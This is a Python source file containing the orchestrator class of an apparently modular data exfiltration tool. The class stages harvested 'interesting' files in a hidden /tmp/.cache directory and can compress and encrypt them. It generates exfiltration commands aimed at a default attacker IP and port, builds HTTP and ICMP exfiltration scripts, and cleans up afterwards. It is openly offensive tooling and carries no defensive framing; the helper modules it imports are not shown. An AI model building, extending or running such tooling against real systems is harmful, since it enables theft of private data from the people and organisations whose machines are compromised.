"""
Main orchestrator for data exfiltration
"""

import os
from typing import List, Dict
from ..discovery import FileFinder
from ..preparation import Staging
from ..methods import CommandGenerator
from ..output import ManifestGenerator, ServerScriptGenerator


class DataExfiltrator:
    """Main class coordinating data exfiltration operations"""
    
    def __init__(self, staging_dir: str = '/tmp/.cache'):
        self.staging_dir = staging_dir
        
        # Create staging directory
        try:
            os.makedirs(staging_dir, exist_ok=True)
            os.chmod(staging_dir, 0o700)  # Owner only
        except:
            self.staging_dir = '/tmp'
        
        # Initialize components
        self.file_finder = FileFinder()
        self.staging = Staging(self.staging_dir)
        self.cmd_generator = CommandGenerator()
        self.manifest_gen = ManifestGenerator(self.staging_dir)
        self.server_gen = ServerScriptGenerator(self.staging_dir)
    
    def find_interesting_data(self) -> Dict:
        """Find interesting files for exfiltration"""
        return self.file_finder.find_all()
    
    def stage_for_exfiltration(self, file_paths: List[str], 
                               compress: bool = True,
                               encrypt: bool = False, 
                               password: str = '') -> List[Dict]:
        """Prepare files for exfiltration"""
        return self.staging.stage_files(file_paths, compress, encrypt, password)
    
    def generate_exfil_commands(self, staged_files: List[Dict],
                               attacker_ip: str = '10.10.14.5',
                               attacker_port: int = 8000) -> Dict:
        """Generate exfiltration commands"""
        return self.cmd_generator.generate_all_commands(
            staged_files, attacker_ip, attacker_port
        )
    
    def create_manifest(self, staged_files: List[Dict]) -> str:
        """Create manifest file"""
        return self.manifest_gen.create(staged_files)
    
    def create_exfil_server_script(self) -> str:
        """Create HTTP server script"""
        return self.server_gen.create_http_server()
    
    def create_icmp_exfil_scripts(self) -> tuple:
        """Create ICMP exfiltration scripts"""
        return self.server_gen.create_icmp_scripts()
    
    def cleanup_staging(self):
        """Clean up staging directory"""
        self.staging.cleanup()
